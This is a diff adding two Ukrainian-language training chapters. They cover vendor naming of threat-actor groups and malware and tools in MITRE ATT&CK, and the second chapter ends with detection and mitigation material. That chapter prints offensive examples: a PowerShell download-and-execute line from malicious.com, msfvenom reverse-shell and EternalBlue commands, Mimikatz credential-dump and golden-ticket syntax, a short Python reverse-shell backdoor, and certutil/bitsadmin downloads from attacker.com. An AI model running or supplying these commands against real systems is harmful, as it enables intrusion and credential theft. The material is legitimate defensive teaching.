@@ -7153,3 +7153,804 @@ Associated TTPs:
 
 
 -----------------------------------------------------------------------------------------------
+
+# 31  Групи зловмисників у кібербезпеці: номенклатура та класифікація
+
+## Вступ
+
+У світі кібербезпеки одним із найважливіших понять є **групи зловмисників** (Adversary Groups або Threat Actor Groups). Розуміння того, як ці групи ідентифікуються, відстежуються та класифікуються, є критично важливим для ефективного аналізу загроз та побудови захисту.
+
+## Що таке групи зловмисників?
+
+### Визначення
+**Група зловмисників** - це організована сукупність кіберзлочинців, які:
+- Демонструють **схожу поведінку** в своїх атаках
+- Використовують **подібні техніки** та інструменти
+- Мають **спільні цілі** та мотивацію
+- Відстежуються під **спільним ідентифікаційним іменем**
+
+### Ключові характеристики груп:
+- **Постійність** - діють протягом тривалого періоду
+- **Складність** - використовують розвинені техніки
+- **Цілеспрямованість** - атакують конкретні організації або сектори
+- **Еволюція** - адаптують свої методи з часом
+
+## Проблема множинної номенклатури
+
+### Чому існують різні назви?
+
+**Основна проблема:** Кожен вендор (постачальник рішень безпеки) відстежує групи зловмисників за власною системою найменувань.
+
+**Наслідок:** Одна і та ж група може мати **3-5 різних назв** у різних компаній.
+
+### Приклад множинної номенклатури:
+
+**Та сама група може називатися:**
+```
+Mandiant:     APT41
+CrowdStrike:  Double Dragon
+Microsoft:    Barium
+Kaspersky:    Winnti
+Symantec:     Blackfly
+```
+
+**Чому це відбувається:**
+- Різні компанії **незалежно виявляють** групи
+- Кожна використовує **власну систему найменувань**
+- Координація між вендорами **обмежена**
+- **Комерційна конкуренція** впливає на обмін інформацією
+
+## Основні системи найменувань
+
+### 1. Mandiant (FireEye) - APT номенклатура
+
+**Система найменувань:**
+- **APT** (Advanced Persistent Threat) + **номер**
+- Приклади: APT1, APT28, APT41, APT29
+
+**Характеристики:**
+```
+APT41:
+- Походження: Китай
+- Тип: Фінансово мотивовані + державне спонсорство
+- Активність: 2012 - дотепер
+- Цілі: Фінансовий сектор, охорона здоров'я, телекомунікації
+```
+
+**Переваги системи Mandiant:**
+- Проста нумерація
+- Широко визнана в індустрії
+- Детальні звіти про техніки
+
+### 2. CrowdStrike - Тварини + Походження
+
+**Система найменувань:**
+- **Тварина** + **Характеристика** = Назва групи
+- Тварина асоціюється з **країною походження**
+
+**Приклади за країнами:**
+
+**Росія (Ведмідь - Bear):**
+```
+Fancy Bear (APT28):
+- Військова розвідка (ГРУ)
+- Цілі: Політичні організації, НАТО
+
+Cozy Bear (APT29):
+- Служба зовнішньої розвідки (СВР)
+- Цілі: Урядові структури, дипломатія
+```
+
+**Китай (Панда - Panda):**
+```
+Deep Panda:
+- Цілі: Інтелектуальна власність
+- Сектори: Технології, аерокосмічна галузь
+
+Goblin Panda:
+- Цілі: Політична розвідка
+- Регіон: В'єтнам, Гонконг
+```
+
+**Північна Корея (Гепард - Chollima):**
+```
+Lazarus Group → Stardust Chollima
+- Відомі атаки: WannaCry, Sony Pictures
+- Мотивація: Фінансова + політична
+```
+
+### 3. Microsoft - Погодні явища + Походження
+
+**Система найменувань:**
+- **Погодне явище** пов'язане з **регіоном походження**
+- Фокус на **походженні** та **активності**
+
+**Приклади:**
+
+**Росія (Blizzard - Хуртовина):**
+```
+Midnight Blizzard (APT29):
+- Попередня назва: Nobelium
+- Цілі: Урядові та IT організації
+- Відомі атаки: SolarWinds supply chain
+
+Forest Blizzard (APT28):
+- Попередня назва: Strontium
+- Цілі: Політичні кампанії, НАТО
+```
+
+**Китай (Typhoon - Тайфун):**
+```
+Volt Typhoon:
+- Цілі: Критична інфраструктура США
+- Техніки: "Living off the land"
+
+Flax Typhoon:
+- Цілі: Урядові організації Тайваню
+- Особливості: Довготривалі кампанії
+```
+
+**Іран (Sandstorm - Піщана буря):**
+```
+Mint Sandstorm:
+- Цілі: Активісти, журналісти
+- Техніки: Фішинг, соціальна інженерія
+```
+
+## Детальний аналіз: APT41
+
+### Чому APT41 є показовою групою?
+
+**1. Популярність та медійність:**
+- Широко висвітлюється в ЗМІ
+- Численні публічні звіти
+- Високий рівень загрози
+
+**2. Унікальна модель діяльності:**
+- **Подвійна мотивація:** Державне спонсорство + фінансова вигода
+- **Гібридні операції:** Шпигунство + кіберзлочинність
+
+**3. Розвинені техніки:**
+- Складні malware родини
+- Supply chain атаки
+- Zero-day експлойти
+
+### Характеристики APT41:
+
+**Технічний профіль:**
+```
+Походження: Китай
+Активність: 2012 - дотепер
+Розмір: 30-50 операторів
+Ресурси: Значні (державна підтримка)
+```
+
+**Цілі атак:**
+- **За географією:** США, Європа, Азіатсько-Тихоокеанський регіон
+- **За секторами:** Охорона здоров'я, фінанси, телекомунікації, технології
+
+**Типові техніки (MITRE ATT&CK):**
+```
+Initial Access:
+- Spearphishing (T1566)
+- Supply Chain Compromise (T1195)
+
+Persistence:
+- Registry Run Keys (T1547.001)
+- Scheduled Tasks (T1053.005)
+
+Defense Evasion:
+- Code Signing (T1553.002)
+- Masquerading (T1036)
+```
+
+## Практичне застосування знань про групи
+
+### 1. Threat Intelligence
+
+**При аналізі інциденту:**
+```python
+# Псевдокод для ідентифікації групи
+def identify_threat_group(indicators):
+    techniques = extract_techniques(indicators)
+    tools = identify_tools(indicators)
+    targets = analyze_targets(indicators)
+    
+    # Порівняння з відомими групами
+    matches = compare_with_database(techniques, tools, targets)
+    return matches
+```
+
+### 2. Attribution (Атрибуція)
+
+**Фактори для визначення групи:**
+- **TTPs** (Tactics, Techniques, Procedures)
+- **Інфраструктура** (домени, IP-адреси)
+- **Malware** (унікальні зразки, підписи)
+- **Цілі** (типи організацій, географія)
+- **Часові рамки** (графік активності)
+
+### 3. Defensive Strategies
+
+**Адаптація захисту під конкретні групи:**
+
+**Проти APT41:**
+```
+Рекомендації:
+1. Посилений моніторинг supply chain
+2. Підвищена увага до медичних та фінансових даних
+3. Моніторинг активності в азіатсько-тихоокеанські години
+4. Блокування відомих IoC (Indicators of Compromise)
+```
+
+**Проти Fancy Bear:**
+```
+Рекомендації:
+1. Захист від spearphishing атак
+2. Моніторинг політично вмотивованих цілей
+3. Підвищена безпека під час виборів
+4. Контроль доступу до чутливої інформації
+```
+
+## Інструменти для відстеження груп
+
+### 1. MITRE ATT&CK Navigator
+
+**Візуалізація активності групи:**
+```json
+{
+  "group": "APT41",
+  "techniques": [
+    "T1566.001", // Spearphishing Attachment
+    "T1195.002", // Software Supply Chain
+    "T1053.005"  // Scheduled Task
+  ],
+  "coverage": "high"
+}
+```
+
+### 2. Threat Intelligence Platforms
+
+**Основні платформи:**
+- **MISP** (Malware Information Sharing Platform)
+- **OpenCTI** (Open Cyber Threat Intelligence)
+- **ThreatConnect**
+- **Anomali**
+
+### 3. Open Source Resources
+
+**Безкоштовні ресурси:**
+```
+- MITRE ATT&CK Groups: attack.mitre.org/groups/
+- ThaiCERT Threat Group Cards
+- Malpedia: malpedia.caad.fkie.fraunhofer.de
+- APTnotes: github.com/aptnotes/data
+```
+
+## Проблеми та виклики
+
+### 1. Overlap та Subdivision
+
+**Коли групи перетинаються:**
+- Спільне використання інструментів
+- Аутсорсинг операцій
+- Зміна складу команд
+
+### 2. False Flag Operations
+
+**Навмисне введення в оману:**
+- Імітація техніки інших груп
+- Використання "чужих" інструментів
+- Створення хибних слідів
+
+### 3. Еволюція груп
+
+**Зміни з часом:**
+- Розділення великих груп
+- Об'єднання малих груп
+- Зміна мотивації та цілей
+
+## Кращі практики роботи з групами
+
+### 1. Множинні джерела
+
+**Завжди перевіряйте інформацію:**
+```
+- Порівнюйте дані від різних вендорів
+- Шукайте альтернативні назви груп
+- Використовуйте mapping таблиці
+```
+
+### 2. Фокус на поведінці
+
+**Не покладайтеся лише на назви:**
+- Аналізуйте TTPs
+- Вивчайте цілі та мотивацію
+- Розглядайте еволюцію техніки
+
+### 3. Контекстуальний аналіз
+
+**Враховуйте контекст:**
+- Геополітичну ситуацію
+- Економічні фактори
+- Технологічні тренди
+
+## Висновок
+
+Розуміння систем найменувань та класифікації груп зловмисників є фундаментальним для:
+
+**Професіоналів кібербезпеки:**
+- Ефективного аналізу загроз
+- Правильної атрибуції інцидентів
+- Побудови відповідного захисту
+
+**Організацій:**
+- Оцінки специфічних ризиків
+- Адаптації стратегії безпеки
+- Планування реагування на інциденти
+
+**Ключові моменти для запам'ятовування:**
+1. **Одна група = множина назв** у різних вендорів
+2. **APT41, Fancy Bear, Midnight Blizzard** - приклади важливих груп
+3. **Системи найменувань** відображають підходи вендорів
+4. **Контекст важливіший за назву** при аналізі загроз
+
+Знання про групи зловмисників та їх номенклатуру дозволяє безпековим фахівцям ефективно орієнтуватися в ландшафті сучасних кіберзагроз та приймати обґрунтовані рішення щодо захисту.
+
+---------------------------------------------------------------------------------------------
+
+# 32 Програмне забезпечення в контексті MITRE ATT&CK
+
+## Вступ
+
+Програмне забезпечення (Software) в рамках MITRE ATT&CK є одним із небагатьох елементів фреймворку, де ми заглиблюємося в конкретні технології більш детально, ніж це відбувається з техніками та підтехніками. На відміну від індикаторів компрометації (IoC), програмне забезпечення є невід'ємною частиною поведінкового аналізу зловмисників.
+
+## Визначення програмного забезпечення в ATT&CK
+
+### Що таке Software у контексті ATT&CK?
+
+**Software** - це інструменти або зловмисне програмне забезпечення (malware), які використовуються зловмисниками для досягнення своїх цілей.
+
+### Ключові характеристики:
+
+**1. Завжди пов'язане з контекстом:**
+- Ніколи не існує ізольовано
+- Завжди прив'язане до конкретних техніків
+- Пов'язане з групами зловмисників
+- Документується в контексті кампаній
+
+**2. Більше ніж просто malware:**
+- Комерційні інструменти
+- Відкриті програмні продукти
+- Вбудовані системні утиліти
+- Публічно доступне ПЗ
+
+## Типи програмного забезпечення в ATT&CK
+
+### 1. Вбудовані системні утиліти
+
+**PowerShell:**
+```powershell
+# Приклад використання PowerShell зловмисниками
+Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')
+
+# Bypass Execution Policy
+powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File malicious.ps1
+```
+
+**Чому PowerShell вважається "Software" в ATT&CK:**
+- Широко використовується зловмисниками
+- Має потужні можливості для атак
+- Часто використовується для "living off the land" техніки
+- Може виконувати код без запису на диск
+
+**Cmd.exe (Command Prompt):**
+```cmd
+# Збір інформації про систему
+systeminfo
+net user
+net group "Domain Admins" /domain
+
+# Латеральне переміщення
+net use \\target\c$ /user:domain\username password
+```
+
+### 2. Легітимні інструменти адміністрування
+
+**PsExec (Sysinternals):**
+```cmd
+# Віддалене виконання команд
+psexec \\target -u domain\admin -p password cmd.exe
+
+# Інтерактивна сесія
+psexec \\target -u domain\admin -p password -i cmd.exe
+```
+
+**Mimikatz:**
+```
+# Отримання паролів з пам'яті
+sekurlsa::logonpasswords
+
+# Дамп хешів SAM
+lsadump::sam
+
+# Golden Ticket атака
+kerberos::golden /user:admin /domain:corp.com /sid:S-1-5-21-... /krbtgt:hash
+```
+
+### 3. Відкриті інструменти
+
+**Metasploit Framework:**
+```ruby
+# Створення payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > backdoor.exe
+
+# Експлуатація
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST target_ip
+run
+```
+
+**Cobalt Strike:**
+```
+# Beacon payload
+beacon> shell whoami
+beacon> powershell Get-Process
+beacon> screenshot
+```
+
+### 4. Кастомне зловмисне ПЗ
+
+**APT Malware приклади:**
+
+**Gh0st RAT:**
+- Походження: Китайські APT групи
+- Функціонал: Віддалене управління, keylogging, screen capture
+- Техніки: Process Injection, Registry Persistence
+
+**Carbanak:**
+- Використання: Фінансово мотивовані групи
+- Цілі: Банківські установи
+- Можливості: Латеральне переміщення, credential harvesting
+
+## Зв'язок Software з іншими компонентами ATT&CK
+
+### 1. Прив'язка до техніік
+
+**Приклад: PowerShell і техніки**
+
+```json
+{
+  "software": "PowerShell",
+  "techniques": [
+    {
+      "id": "T1059.001",
+      "name": "Command and Scripting Interpreter: PowerShell",
+      "description": "Виконання команд через PowerShell"
+    },
+    {
+      "id": "T1055",
+      "name": "Process Injection",
+      "description": "Ін'єкція коду в процеси через PowerShell"
+    },
+    {
+      "id": "T1140",
+      "name": "Deobfuscate/Decode Files or Information",
+      "description": "Декодування payload через PowerShell"
+    }
+  ]
+}
+```
+
+### 2. Прив'язка до груп
+
+**Приклад: APT29 і їх інструменти**
+
+```json
+{
+  "group": "APT29 (Cozy Bear)",
+  "software_used": [
+    {
+      "name": "PowerShell",
+      "usage": "Віддалене виконання команд, credential harvesting"
+    },
+    {
+      "name": "WMI",
+      "usage": "Латеральне переміщення, persistence"
+    },
+    {
+      "name": "Cobalt Strike",
+      "usage": "Post-exploitation, command and control"
+    }
+  ]
+}
+```
+
+### 3. Прив'язка до кампаній
+
+**Приклад: SolarWinds кампанія**
+
+```json
+{
+  "campaign": "SolarWinds Supply Chain Attack",
+  "software_components": [
+    {
+      "name": "SUNBURST",
+      "type": "Backdoor",
+      "delivery": "Supply chain compromise"
+    },
+    {
+      "name": "TEARDROP",
+      "type": "Dropper",
+      "purpose": "Second-stage payload delivery"
+    },
+    {
+      "name": "Cobalt Strike",
+      "type": "Post-exploitation framework",
+      "usage": "Interactive access and lateral movement"
+    }
+  ]
+}
+```
+
+## Категорії програмного забезпечення
+
+### 1. За призначенням
+
+**Malware (зловмисне ПЗ):**
+```
+- Backdoors (бекдори)
+- Trojans (троянські коні)
+- Ransomware (вимагачі)
+- Spyware (шпигунське ПЗ)
+- Rootkits (руткіти)
+```
+
+**Dual-use tools (подвійного призначення):**
+```
+- Network scanners (Nmap, Masscan)
+- Password recovery tools (Hashcat, John the Ripper)
+- Remote access tools (TeamViewer, VNC)
+- System administration tools (PsTools, WMI)
+```
+
+### 2. За способом отримання
+
+**Комерційне ПЗ:**
+```
+Cobalt Strike:
+- Ліцензійний продукт для red team тестування
+- Широко використовується зловмисниками
+- Вартість: ~$3,500/рік
+```
+
+**Open Source:**
+```
+Metasploit Community:
+- Безкоштовна версія фреймворку
+- Відкритий код
+- Величезна спільнота розробників
+```
+
+**Кастомне/Закрите:**
+```
+APT Malware:
+- Розробляється конкретними групами
+- Унікальний функціонал
+- Обмежене поширення
+```
+
+### 3. За рівнем складності
+
+**Простий malware:**
+```python
+# Простий Python backdoor
+import socket
+import subprocess
+
+s = socket.socket()
+s.connect(('attacker_ip', 4444))
+
+while True:
+    command = s.recv(1024).decode()
+    output = subprocess.getoutput(command)
+    s.send(output.encode())
+```
+
+**Складний APT malware:**
+```
+Stuxnet характеристики:
+- Множинні zero-day експлойти
+- Модульна архітектура
+- Цілеспрямованість на SCADA системи
+- Самопоширення через USB та мережу
+- Антидетекційні механізми
+```
+
+## "Living off the Land" концепція
+
+### Визначення
+
+**Living off the Land Binaries (LOLBins)** - використання легітимних системних утиліт для зловмисних цілей.
+
+### Переваги для зловмисників:
+
+**1. Менша ймовірність детекції:**
+- Легітимні процеси не викликають підозр
+- Вбудовані інструменти завжди присутні
+- Складніше відрізнити зловмисну активність
+
+**2. Обхід контролів безпеки:**
+- Підписані сертифікатами Microsoft
+- Внесені в білі списки
+- Не заблоковані антивірусами
+
+### Приклади LOLBins:
+
+**Rundll32.exe:**
+```cmd
+# Виконання JavaScript через rundll32
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('XSS');
+
+# Завантаження та виконання payload
+rundll32.exe url.dll,FileProtocolHandler http://attacker.com/payload.exe
+```
+
+**Certutil.exe:**
+```cmd
+# Завантаження файлів
+certutil.exe -urlcache -split -f http://attacker.com/malware.exe malware.exe
+
+# Декодування Base64
+certutil.exe -decode encoded_payload.txt payload.exe
+```
+
+**Bitsadmin.exe:**
+```cmd
+# Завантаження файлів у фоновому режимі
+bitsadmin.exe /transfer job1 http://attacker.com/backdoor.exe %TEMP%\backdoor.exe
+```
+
+## Практичний аналіз Software в ATT&CK
+
+### 1. Дослідження конкретного malware
+
+**Приклад: аналіз EMOTET**
+
+```json
+{
+  "name": "EMOTET",
+  "type": "Banking Trojan / Botnet",
+  "first_seen": "2014",
+  "associated_groups": ["TA542"],
+  "techniques_used": [
+    "T1566.001", // Spearphishing Attachment
+    "T1055",     // Process Injection
+    "T1112",     // Modify Registry
+    "T1083",     // File and Directory Discovery
+    "T1005"      // Data from Local System
+  ],
+  "capabilities": [
+    "Email harvesting",
+    "Credential theft", 
+    "Payload delivery",
+    "Network propagation"
+  ]
+}
+```
+
+### 2. Mapping інструментів на техніки
+
+**PowerShell Mapping:**
+
+| Техніка | ID | Приклад використання |
+|---------|----|--------------------|
+| Command and Scripting Interpreter | T1059.001 | `powershell.exe -c "Get-Process"` |
+| Process Injection | T1055 | `Invoke-ReflectivePEInjection` |
+| Bypass UAC | T1548.002 | `Invoke-BypassUAC` |
+| Credential Dumping | T1003 | `Invoke-Mimikatz` |
+
+### 3. Створення профілю загроз
+
+**Шаблон для аналізу:**
+
+```markdown
+## Software Profile
+
+**Name:** [Назва інструменту]
+**Type:** [Тип ПЗ]
+**First Observed:** [Дата]
+**Associated Groups:** [Список груп]
+
+### Capabilities:
+- [Функціонал 1]
+- [Функціонал 2]
+- [Функціонал 3]
+
+### ATT&CK Techniques:
+| Technique | Sub-technique | Usage |
+|-----------|---------------|-------|
+| T1XXX | T1XXX.XXX | [Опис] |
+
+### Detection Opportunities:
+- [Можливість детекції 1]
+- [Можливість детекції 2]
+
+### Mitigation Strategies:
+- [Стратегія мітигації 1]
+- [Стратегія мітигації 2]
+```
+
+## Детекція та мітигація
+
+### 1. Стратегії детекції
+
+**Поведінкова детекція:**
+```yaml
+rules:
+  - name: "Suspicious PowerShell Activity"
+    condition: 
+      - process: "powershell.exe"
+      - command_line_contains: 
+        - "DownloadString"
+        - "IEX"
+        - "Invoke-Expression"
+        - "bypass"
+    severity: "high"
+```
+
+**Детекція LOLBins:**
+```yaml
+rules:
+  - name: "Certutil Suspicious Usage"
+    condition:
+      - process: "certutil.exe"
+      - command_line_contains:
+        - "-urlcache"
+        - "-decode"
+        - "http"
+    severity: "medium"
+```
+
+### 2. Стратегії мітигації
+
+**Application Control:**
+```powershell
+# Windows Defender Application Control (WDAC)
+# Блокування виконання непідписаних скриптів
+Set-ExecutionPolicy -ExecutionPolicy AllSigned -Scope LocalMachine
+```
+
+**PowerShell Logging:**
+```powershell
+# Увімкнення детального логування PowerShell
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
+```
+
+**Network Monitoring:**
+```
+# Моніторинг мережевої активності системних утиліт
+alert tcp any any -> any any (msg:"Suspicious certutil network activity"; content:"certutil"; sid:1001;)
+```
+
+## Висновок
+
+Програмне забезпечення в контексті MITRE ATT&CK є критично важливим компонентом для розуміння поведінки зловмисників:
+
+**Ключові принципи:**
+1. **Контекстуальність** - Software завжди пов'язане з техніками, групами та кампаніями
+2. **Різноманітність** - Включає як malware, так і легітимні інструменти
+3. **Поведінковий фокус** - Важливо не те, що це за інструмент, а як він використовується
+
+**Практичне значення:**
+- Допомагає в атрибуції атак
+- Полегшує створення правил детекції
+- Сприяє розробці ефективних стратегій захисту
+- Забезпечує контекст для аналізу загроз
+
+Розуміння ролі Software в ATT&CK дозволяє фахівцям з безпеки краще аналізувати загрози, розробляти захисні механізми та приймати обґрунтовані рішення щодо кібербезпеки організації.
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+
+
